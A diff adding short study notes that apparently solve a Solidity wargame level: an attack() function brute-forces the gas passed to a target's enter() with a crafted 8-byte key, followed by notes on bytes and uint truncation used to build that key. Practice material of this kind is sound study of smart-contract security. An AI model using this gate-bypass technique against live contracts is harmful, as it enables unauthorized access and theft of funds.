@@ -1,0 +1,52 @@
+
+Notes
+
+1.   try/cath in solidity
+    
+    Try and catch only work for external calls and contract creation.
+    function attack() public  returns (bool)
+    {
+        for(uint k=1;k <= 8191;k++)
+        {
+            // try and catch only work for external calls and contract creation.
+            try i.enter{gas: 8191*10 + k}(0x000a000000008d4B)
+            {
+                loop = k;
+                return true;
+            }
+            catch
+            {
+
+            }
+        }
+        return false;
+    }
+
+ 2.   Do not use JavaScript in this case it was totally waste of time 
+      use solidity to save time & gas
+
+
+
+
+3.
+
+Example
+
+1 byte = 2 Hexadecimal = 8 bits 
+byte8 = 0x ff..........16th hexadecimal
+bytes1----bytes32
+
+uint8 = 8 bits
+
+uint16(uint160(n))   ==   uint16(uint64(uint32(n)))  ==    uint16(n)
+
+Hexadecimal 0x  ff  ee  ab  cd  ef  09  10  15
+(bytes8)                                    _____
+                                            uint8
+                                        ________
+                                        uint16
+                                ________________
+                                uint32
+                ______________________________
+                uint64
+                                             
